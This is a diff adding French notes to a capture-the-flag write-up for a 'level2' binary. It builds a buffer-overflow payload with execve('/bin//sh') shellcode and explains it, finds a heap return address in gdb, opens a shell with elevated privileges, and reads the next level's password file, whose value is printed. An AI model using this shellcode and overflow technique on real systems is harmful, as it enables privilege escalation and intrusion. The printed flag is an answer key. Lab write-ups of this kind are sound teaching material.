@@ -57,3 +57,44 @@ Quand on rentre quoique ce soit, ca le renvoie
    0x0804853e <+106>:	ret
 
 > python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 59 + "\x08\xa0\x04\x08"' > /tmp/payload
+
+6a 0b          push 0xb             (0xb = 11 -> numéro syscall de execve)
+58             pop eax              (EAX = 11)
+99             cdq                  (EDX = 0 (signe de EAX, ici EAX est positif donc 0))
+52             push edx             (on empile 00 00 00 00 pour le terminateur null \0)
+68 2f2f7368    push 0x68732f2f      (little-endian donc 2f 2f 73 68 (//sh))
+68 2f62696e    push 0x6e69622f      (little-endian donc 2f 62 69 6e (/bin))
+                                    (donc la pile contient : /bin//sh\0)
+89 e3          mov ebx, esp         (ESP = début de la pile)
+31 c9          xor ecx, ecx         (ECX = 0)
+                                    on a donc : EAX = 11 (numero syscall execve)
+                                                EBX = /bin//sh\0 (premier arg)
+                                                ECX = 0 (second arg)
+                                                EDX = 0 (troisieme arg)
+cd 80          int 0x80             (déclenche le syscall numero 11)
+
+buffer est à ebp-0x4c donc 76 octets de ebp, on a 21 octets de shellcode on remplie avec 59 octets en laissant 4 octets pour l'adresse retour
+
+on veut l'adresse de la heap pour l'adresse de retour car elle ne commence pas par 0xb et donc on peut passer la verif. pour se faire
+dans gdb
+>break *0x08048535 (adresse du call strdup)
+>run
+Starting program: /home/user/level2/level2 
+
+
+
+Breakpoint 1, 0x08048535 in p ()
+>step
+>p/x $eax
+$1 = 0x804a008
+
+
+
+> cat /tmp/payload - | ./level2 ("-" laisse l'entrée standard ouverte et permet d'utiliser le shell lancé par execve)
+
+> id
+uid=2021(level2) gid=2021(level2) euid=2022(level3) egid=100(users) groups=2022(level3),100(users),2021(level2)
+
+>cat /home/user/level3/.pass
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+
